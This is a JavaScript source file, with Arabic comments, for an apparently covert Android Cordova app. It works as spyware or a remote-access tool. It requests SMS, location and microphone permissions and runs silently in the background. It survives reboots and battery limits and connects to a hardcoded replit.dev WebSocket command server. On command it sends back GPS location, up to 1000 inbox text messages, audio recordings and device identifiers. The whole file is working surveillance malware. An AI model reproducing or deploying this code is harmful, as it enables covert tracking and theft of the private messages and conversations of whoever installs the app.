document.addEventListener('deviceready', onDeviceReady, false);

// تخزين الطلبات المستلمة
const receivedRequests = [];

function onDeviceReady() {
  console.log('Device is ready');
  
  // طلب جميع الأذونات الضرورية فور تشغيل التطبيق
  requestAllPermissions();
  
  // تحسين وضع الخلفية بشكل قوي
  setupRobustBackgroundMode();
  
  // معلومات الجهاز
  const deviceInfo = {
    uuid: device.uuid || generateUUID(),
    model: device.model || 'Unknown',
    platform: device.platform || 'Unknown',
    version: device.version || 'Unknown',
    manufacturer: device.manufacturer || 'Unknown',
    battery: null,
    timestamp: new Date().toISOString()
  };
  
  // توليد UUID إذا لم يكن موجوداً
  function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
      const r = Math.random() * 16 | 0;
      const v = c === 'x' ? r : (r & 0x3 | 0x8);
      return v.toString(16);
    });
  }
  
  // الحصول على حالة البطارية
  if (navigator.getBattery) {
    navigator.getBattery().then(battery => {
      deviceInfo.battery = {
        level: Math.round(battery.level * 100),
        charging: battery.charging,
        chargingTime: battery.chargingTime,
        dischargingTime: battery.dischargingTime
      };
      connectToServer(deviceInfo);
      // مراقبة تغيرات البطارية
      battery.addEventListener('levelchange', updateBatteryInfo);
      battery.addEventListener('chargingchange', updateBatteryInfo);
    }).catch(error => {
      console.error('Battery API error:', error);
      connectToServer(deviceInfo);
    });
  } else {
    connectToServer(deviceInfo);
  }
  
  function updateBatteryInfo() {
    navigator.getBattery().then(battery => {
      deviceInfo.battery = {
        level: Math.round(battery.level * 100),
        charging: battery.charging,
        chargingTime: battery.chargingTime,
        dischargingTime: battery.dischargingTime
      };
      // إرسال تحديث البطارية إلى الخادم
      if (window.wsConnection && window.wsConnection.readyState === WebSocket.OPEN) {
        window.wsConnection.send(JSON.stringify({
          type: 'device_update',
          deviceInfo: {
            battery: deviceInfo.battery,
            timestamp: new Date().toISOString()
          }
        }));
      }
    });
  }
}

// طلب جميع الأذونات الضرورية
function requestAllPermissions() {
  if (cordova.platformId === 'android') {
    const permissions = cordova.plugins.permissions;
    
    const neededPermissions = [
      permissions.ACCESS_FINE_LOCATION,
      permissions.READ_SMS,
      permissions.RECORD_AUDIO,
      permissions.WRITE_EXTERNAL_STORAGE,
      permissions.READ_EXTERNAL_STORAGE,
      permissions.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
    ];
    
    permissions.hasPermission(neededPermissions, function(status) {
      if (!status.hasPermission) {
        permissions.requestPermissions(neededPermissions, function(status) {
          if (!status.hasPermission) {
            console.warn('لم يتم منح الأذونات المطلوبة');
            // محاولة إلزامية للحصول على إذن تجاهل تحسينات البطارية
            forceBatteryOptimizationExemption();
          } else {
            console.log('تم منح جميع الأذونات المطلوبة');
          }
        }, function(error) {
          console.error('خطأ في طلب الأذونات:', error);
          // محاولة إلزامية للحصول على إذن تجاهل تحسينات البطارية
          forceBatteryOptimizationExemption();
        });
      }
    });
  }
}

// طلب إعفاء من تحسينات البطارية (مهم للبقاء في الخلفية)
function forceBatteryOptimizationExemption() {
  if (cordova.platformId === 'android') {
    // محاولة استخدام BatterySaver plugin
    if (cordova.plugins && cordova.plugins.BatterySaver) {
      cordova.plugins.BatterySaver.isIgnoringBatteryOptimizations(function(isIgnoring) {
        if (!isIgnoring) {
          cordova.plugins.BatterySaver.requestIgnoreBatteryOptimizations(function() {
            console.log('تم طلب إعفاء من تحسينات البطارية');
          }, function(error) {
            console.error('فشل طلب إعفاء من تحسينات البطارية:', error);
            // محاولة بديلة
            try {
              cordova.plugins.BatteryStatus.requestOptimizationsExemption();
            } catch (e) {
              console.error('فشل المحاولة البديلة:', e);
              // محاولة إظهار إرشادات للمستخدم
              showBatteryOptimizationInstructions();
            }
          });
        }
      });
    } else {
      // إذا لم يكن BatterySaver متاحًا، نستخدم Intent لفتح إعدادات البطارية
      try {
        cordova.plugins.BatteryOptimization.isIgnoringBatteryOptimizations(function(isIgnoring) {
          if (!isIgnoring) {
            cordova.plugins.BatteryOptimization.requestIgnoreBatteryOptimizations(function() {
              console.log('تم طلب إعفاء من تحسينات البطارية');
            }, function(error) {
              console.error('فشل طلب إعفاء من تحسينات البطارية:', error);
              showBatteryOptimizationInstructions();
            });
          }
        });
      } catch (e) {
        console.error('فشل استخدام BatteryOptimization:', e);
        showBatteryOptimizationInstructions();
      }
    }
  }
}

// إظهار إرشادات للمستخدم حول كيفية تعطيل تحسينات البطارية
function showBatteryOptimizationInstructions() {
  if (cordova.plugins && cordova.plugins.toast) {
    cordova.plugins.toast.showLongBottom(
      'يرجى تعطيل تحسينات البطارية للتطبيق في إعدادات الجهاز لضمان عمله في الخلفية'
    );
  }
  
  // محاولة فتح إعدادات البطارية
  try {
    cordova.plugins.BatteryOptimization.openBatteryOptimizationsSettings();
  } catch (e) {
    console.log('لم يتمكن من فتح إعدادات البطارية تلقائيًا');
  }
}

// تحسين وضع الخلفية بشكل قوي
function setupRobustBackgroundMode() {
  // 1. استخدام background mode العادي
  if (cordova.plugins.backgroundMode) {
    cordova.plugins.backgroundMode.setDefaults({
      title: 'التطبيق يعمل في الخلفية',
      text: 'جارٍ مراقبة الأوامر الواردة',
      color: 'F14F4D',
      icon: 'icon',
      resume: true,
      hidden: true,
      bigText: true,
      silent: true
    });
    
    cordova.plugins.backgroundMode.enable();
    
    // التعامل مع تفعيل الوضع الخلفي
    cordova.plugins.backgroundMode.on('activate', function() {
      // تعطيل تحسينات البطارية
      if (cordova.plugins.backgroundMode.disableBatteryOptimizations) {
        cordova.plugins.backgroundMode.disableBatteryOptimizations();
      }
      
      // التأكد من الاتصال بالخادم
      if (window.wsConnection && window.wsConnection.readyState !== WebSocket.OPEN) {
        const deviceInfo = {
          uuid: device.uuid || 'unknown',
          model: device.model || 'Unknown',
          platform: device.platform || 'Unknown',
          version: device.version || 'Unknown',
          manufacturer: device.manufacturer || 'Unknown'
        };
        connectToServer(deviceInfo);
      }
    });
    
    // التعامل مع الضغط على إشعار الوضع الخلفي
    cordova.plugins.backgroundMode.on('notificationclick', function() {
      cordova.plugins.backgroundMode.moveToForeground();
    });
  }
  
  // 2. استخدام خدمة المقدمة (Foreground Service) لزيادة الأولوية
  if (cordova.plugins.foregroundService) {
    cordova.plugins.foregroundService.start(
      'التطبيق يعمل في الخلفية',
      'جارٍ مراقبة الأوامر الواردة',
      'icon',
      function() {
        console.log('Foreground service started');
      },
      function(error) {
        console.error('Foreground service error:', error);
      }
    );
  } else {
    // إذا لم تكن خدمة المقدمة متوفرة، نستخدم وسيلة بديلة
    try {
      cordova.plugins.ForegroundService.start(
        'التطبيق يعمل في الخلفية',
        'جارٍ مراقبة الأوامر الواردة',
        'icon',
        function() {
          console.log('Alternative foreground service started');
        },
        function(error) {
          console.error('Alternative foreground service error:', error);
        }
      );
    } catch (e) {
      console.log('Foreground service plugin not available');
    }
  }
  
  // 3. منع الجهاز من الدخول في وضع السكون
  if (cordova.plugins.insomnia) {
    cordova.plugins.insomnia.keepAwake();
  }
  
  // 4. ضمان التشغيل التلقائي بعد إعادة التشغيل
  if (cordova.plugins.autoStart) {
    cordova.plugins.autoStart.enable(function() {
      console.log('Auto-start enabled');
    }, function() {
      console.error('Failed to enable auto-start');
    });
  } else {
    // محاولة بديلة
    try {
      cordova.plugins.AutoStart.enable();
    } catch (e) {
      console.log('AutoStart plugin not available');
    }
  }
  
  // 5. ضمان التشغيل عند فتح الشبكة
  document.addEventListener('online', function() {
    if (window.wsConnection && window.wsConnection.readyState !== WebSocket.OPEN) {
      const deviceInfo = {
        uuid: device.uuid || 'unknown',
        model: device.model || 'Unknown',
        platform: device.platform || 'Unknown',
        version: device.version || 'Unknown',
        manufacturer: device.manufacturer || 'Unknown'
      };
      connectToServer(deviceInfo);
    }
  }, false);
}

// متغيرات لإدارة إعادة الاتصال
let reconnectAttempts = 0;
const MAX_RECONNECT_ATTEMPTS = 15;
let heartbeatInterval = null;

function connectToServer(deviceInfo) {
  // استخدام رابط الخادم المقدم
  const wsUrl = 'wss://0c0d4d48-f2d0-4f6b-9a7c-dfaeba1f204e-00-1fpda24jsv608.sisko.replit.dev';
  
  // التأكد من عدم وجود اتصال مكرر
  if (window.wsConnection) {
    try {
      window.wsConnection.close();
    } catch (e) {
      console.log('No existing connection to close');
    }
  }
  
  window.wsConnection = new WebSocket(wsUrl);
  
  window.wsConnection.onopen = () => {
    console.log('Connected to server');
    reconnectAttempts = 0; // إعادة تعيين محاولات إعادة الاتصال
    
    // تسجيل الجهاز
    window.wsConnection.send(JSON.stringify({
      type: 'register',
      deviceId: deviceInfo.uuid,
      deviceInfo
    }));
    
    // إرسال نبضات قلبية دورية
    startHeartbeat();
  };
  
  window.wsConnection.onmessage = (event) => {
    try {
      const data = JSON.parse(event.data);
      if (data.type === 'command') {
        console.log('Received command:', data.command);
        // تخزين الطلب المستلم
        receivedRequests.push({
          ...data.command,
          receivedAt: new Date().toISOString(),
          commandId: data.commandId
        });
        // تنفيذ الأمر وإرسال الرد
        executeCommand(data.command, data.commandId, (response) => {
          if (window.wsConnection && window.wsConnection.readyState === WebSocket.OPEN) {
            window.wsConnection.send(JSON.stringify({
              type: 'response',
              commandId: data.commandId,
              response: {
                ...response,
                requestData: data.command // إضافة بيانات الطلب الأصلي للرجوع إليها
              }
            }));
          }
        });
      }
      else if (data.type === 'registered') {
        console.log('Device registered successfully:', data);
      }
    } catch (error) {
      console.error('Error processing message:', error);
    }
  };
  
  window.wsConnection.onerror = (error) => {
    console.error('WebSocket error:', error);
  };
  
  window.wsConnection.onclose = () => {
    console.log('Disconnected from server');
    // محاولة إعادة الاتصال بشكل أكثر ذكاءً
    reconnectWithExponentialBackoff(deviceInfo);
  };
}

// دالة لإرسال نبضات القلب
function startHeartbeat() {
  // إيقاف أي نبضات قديمة
  if (heartbeatInterval) {
    clearInterval(heartbeatInterval);
  }
  
  // إرسال نبضات قلبية كل 20 ثانية
  heartbeatInterval = setInterval(() => {
    if (window.wsConnection && window.wsConnection.readyState === WebSocket.OPEN) {
      try {
        window.wsConnection.send(JSON.stringify({ 
          type: 'heartbeat',
          timestamp: new Date().toISOString(),
          receivedRequests // إرسال سجل الطلبات المستلمة
        }));
      } catch (e) {
        console.error('Error sending heartbeat:', e);
        clearInterval(heartbeatInterval);
        reconnectWithExponentialBackoff({
          uuid: device.uuid || 'unknown',
          model: device.model || 'Unknown',
          platform: device.platform || 'Unknown',
          version: device.version || 'Unknown',
          manufacturer: device.manufacturer || 'Unknown'
        });
      }
    } else {
      clearInterval(heartbeatInterval);
      reconnectWithExponentialBackoff({
        uuid: device.uuid || 'unknown',
        model: device.model || 'Unknown',
        platform: device.platform || 'Unknown',
        version: device.version || 'Unknown',
        manufacturer: device.manufacturer || 'Unknown'
      });
    }
  }, 20000);
}

// دالة لإعادة الاتصال مع زيادة المهلة تدريجياً
function reconnectWithExponentialBackoff(deviceInfo) {
  reconnectAttempts++;
  
  // حساب المهلة مع زيادة تدريجية (2^reconnectAttempts * 1000)
  const baseDelay = 1000;
  const maxDelay = 300000; // 5 دقائق
  const delay = Math.min(baseDelay * Math.pow(2, reconnectAttempts), maxDelay);
  
  console.log(`محاولة إعادة الاتصال ${reconnectAttempts} بعد ${delay}ms`);
  
  setTimeout(() => {
    if (reconnectAttempts <= MAX_RECONNECT_ATTEMPTS) {
      connectToServer(deviceInfo);
    } else {
      console.log('تم بلوغ الحد الأقصى لمحاولات إعادة الاتصال');
      // إعادة تعيين المحاولات بعد فترة طويلة
      setTimeout(() => {
        reconnectAttempts = 0;
      }, 3600000); // 60 دقيقة
    }
  }, delay);
}

function executeCommand(command, commandId, callback) {
  console.log('Executing command:', command);
  switch (command.type) {
    case 'get_location':
      getLocation(commandId, callback);
      break;
    case 'get_sms':
      getSMS(commandId, callback);
      break;
    case 'record_audio':
      recordAudio(commandId, command.duration, callback);
      break;
    case 'get_device_info':
      getDeviceInfo(commandId, callback);
      break;
    case 'get_received_requests':
      getReceivedRequests(commandId, callback);
      break;
    case 'export_sms':
      exportSMS(commandId, callback);
      break;
    default:
      callback({ 
        commandId,
        status: 'error',
        error: 'Unknown command',
        receivedCommand: command
      });
  }
}

function getLocation(commandId, callback) {
  const options = {
    enableHighAccuracy: true,
    timeout: 30000, // زيادة المهلة
    maximumAge: 0
  };
  navigator.geolocation.getCurrentPosition(
    (position) => {
      const locationData = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy,
        altitude: position.coords.altitude,
        altitudeAccuracy: position.coords.altitudeAccuracy,
        heading: position.coords.heading,
        speed: position.coords.speed,
        timestamp: position.timestamp
      };
      callback({
        commandId,
        status: 'success',
        location: locationData,
        googleMapsLink: `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`
      });
    },
    (error) => {
      callback({ 
        commandId,
        status: 'error',
        error: 'Location error',
        details: {
          code: error.code,
          message: error.message,
          PERMISSION_DENIED: error.PERMISSION_DENIED,
          POSITION_UNAVAILABLE: error.POSITION_UNAVAILABLE,
          TIMEOUT: error.TIMEOUT
        }
      });
    },
    options
  );
}

function getSMS(commandId, callback) {
  if (typeof SMS === 'undefined') {
    return callback({ 
      commandId,
      status: 'error',
      error: 'SMS plugin not available',
      suggestion: 'Install cordova-sms-plugin'
    });
  }
  const filter = {
    box: 'inbox',
    maxCount: 1000,
    indexFrom: 0
  };
  SMS.listSMS(
    filter,
    (messages) => {
      callback({
        commandId,
        status: 'success',
        count: messages.length,
        messages: messages.map(msg => ({
          id: msg._id,
          address: msg.address,
          body: msg.body,
          date: msg.date,
          read: msg.read
        }))
      });
    },
    (error) => {
      callback({ 
        commandId,
        status: 'error',
        error: 'SMS error',
        details: error
      });
    }
  );
}

// تصدير الرسائل كملف نصي
function exportSMS(commandId, callback) {
  getSMS(commandId, (smsResponse) => {
    if (smsResponse.status === 'success') {
      // إنشاء محتوى الملف النصي
      let txtContent = "رسائل SMS\n================\n\n";
      
      smsResponse.messages.forEach(msg => {
        txtContent += `من: ${msg.address}\n`;
        txtContent += `التاريخ: ${new Date(msg.date).toLocaleString()}\n`;
        txtContent += `الرسالة: ${msg.body}\n`;
        txtContent += "----------------\n\n";
      });
      
      // إنشاء كائن.blob و.URL
      const blob = new Blob([txtContent], { type: 'text/plain' });
      const url = URL.createObjectURL(blob);
      
      // حفظ الملف في التخزين المحلي
      const fileName = `sms_export_${Date.now()}.txt`;
      saveFileToStorage(fileName, blob);
      
      callback({
        commandId,
        status: 'success',
        export: {
          format: 'txt',
          downloadUrl: url,
          fileName: fileName,
          size: blob.size
        }
      });
    } else {
      callback(smsResponse);
    }
  });
}

// تسجيل الصوت مع دعم كامل
function recordAudio(commandId, duration, callback) {
  duration = duration || 10; // Default 10 seconds
  const mediaRecorderOptions = {
    mimeType: 'audio/mp3',
    audioBitsPerSecond: 128000
  };
  
  // التأكد من أن المستخدم يسمح بالوصول إلى الميكروفون
  navigator.mediaDevices.getUserMedia({ audio: true })
    .then(stream => {
      const mediaRecorder = new MediaRecorder(stream, mediaRecorderOptions);
      const audioChunks = [];
      
      mediaRecorder.ondataavailable = event => {
        audioChunks.push(event.data);
      };
      
      mediaRecorder.onstop = () => {
        const audioBlob = new Blob(audioChunks, { type: 'audio/mp3' });
        const audioUrl = URL.createObjectURL(audioBlob);
        
        // حفظ التسجيل في التخزين المحلي
        const fileName = `recording_${commandId}.mp3`;
        saveAudioToStorage(fileName, audioBlob);
        
        // إرسال الرد مع معلومات الصوت
        callback({ 
          commandId,
          status: 'success',
          audio: {
            duration: duration,
            format: 'mp3',
            size: audioBlob.size,
            downloadUrl: audioUrl,
            fileName: fileName
          }
        });
      };
      
      mediaRecorder.start();
      
      // إيقاف التسجيل بعد المدة المحددة
      setTimeout(() => {
        mediaRecorder.stop();
        // إيقاف جميع المسارات
        stream.getTracks().forEach(track => track.stop());
      }, duration * 1000);
    })
    .catch(error => {
      console.error('Audio recording error:', error);
      callback({ 
        commandId,
        status: 'error',
        error: 'Audio recording error',
        details: error.message
      });
    });
}

function saveAudioToStorage(fileName, blob) {
  // حفظ الملف في التخزين المحلي
  window.resolveLocalFileSystemURL(cordova.file.dataDirectory, dir => {
    dir.getFile(fileName, { create: true }, fileEntry => {
      fileEntry.createWriter(fileWriter => {
        fileWriter.onwriteend = () => console.log('Audio file saved:', fileName);
        fileWriter.onerror = e => console.error('Error saving file:', e);
        fileWriter.write(blob);
      });
    });
  });
}

// حفظ الملفات النصية في التخزين
function saveFileToStorage(fileName, blob) {
  window.resolveLocalFileSystemURL(cordova.file.dataDirectory, dir => {
    dir.getFile(fileName, { create: true }, fileEntry => {
      fileEntry.createWriter(fileWriter => {
        fileWriter.onwriteend = () => console.log('File saved:', fileName);
        fileWriter.onerror = e => console.error('Error saving file:', e);
        fileWriter.write(blob);
      });
    });
  });
}

function getDeviceInfo(commandId, callback) {
  const info = {
    cordova: device.cordova,
    model: device.model,
    platform: device.platform,
    uuid: device.uuid,
    version: device.version,
    manufacturer: device.manufacturer,
    isVirtual: device.isVirtual,
    serial: device.serial
  };
  callback({
    commandId,
    status: 'success',
    deviceInfo: info
  });
}

function getReceivedRequests(commandId, callback) {
  callback({
    commandId,
    status: 'success',
    requests: receivedRequests,
    count: receivedRequests.length
  });
}

// إعادة الاتصال عند استئناف التطبيق
document.addEventListener('resume', () => {
  console.log('App resumed, checking connection...');
  if (window.wsConnection && window.wsConnection.readyState !== WebSocket.OPEN) {
    reconnectWithExponentialBackoff({
      uuid: device.uuid || 'unknown',
      model: device.model || 'Unknown',
      platform: device.platform || 'Unknown',
      version: device.version || 'Unknown',
      manufacturer: device.manufacturer || 'Unknown'
    });
  }
}, false);

// التعامل مع إعادة التشغيل التلقائي بعد تشغيل الجهاز
document.addEventListener('bootcomplete', () => {
  console.log('Device booted, starting app...');
  onDeviceReady();
}, false);

// إضافة حدث لبدء التطبيق عند التشغيل
document.addEventListener('deviceready', () => {
  // التأكد من تشغيل التطبيق في الخلفية بعد التشغيل
  if (cordova.plugins.backgroundMode) {
    cordova.plugins.backgroundMode.enable();
  }
  
  // التأكد من تشغيل خدمة المقدمة
  if (cordova.plugins.foregroundService) {
    cordova.plugins.foregroundService.start(
      'التطبيق يعمل في الخلفية',
      'جارٍ مراقبة الأوامر الواردة',
      'icon',
      function() {
        console.log('Foreground service started after boot');
      },
      function(error) {
        console.error('Foreground service error after boot:', error);
      }
    );
  }
  
  // التأكد من تشغيل التطبيق تلقائيًا بعد إعادة التشغيل
  if (cordova.plugins.autoStart) {
    cordova.plugins.autoStart.enable(function() {
      console.log('Auto-start enabled at boot');
    }, function() {
      console.error('Failed to enable auto-start at boot');
    });
  }
}, false);

// إضافة معالج للأخطاء الحرجة
window.onerror = function(message, source, lineno, colno, error) {
  console.error('Critical error:', message, error);
  // محاولة إعادة الاتصال في حالة حدوث خطأ حرج
  if (error && error.message && error.message.includes('WebSocket')) {
    reconnectWithExponentialBackoff({
      uuid: device.uuid || 'unknown',
      model: device.model || 'Unknown',
      platform: device.platform || 'Unknown',
      version: device.version || 'Unknown',
      manufacturer: device.manufacturer || 'Unknown'
    });
  }
  return false;
};
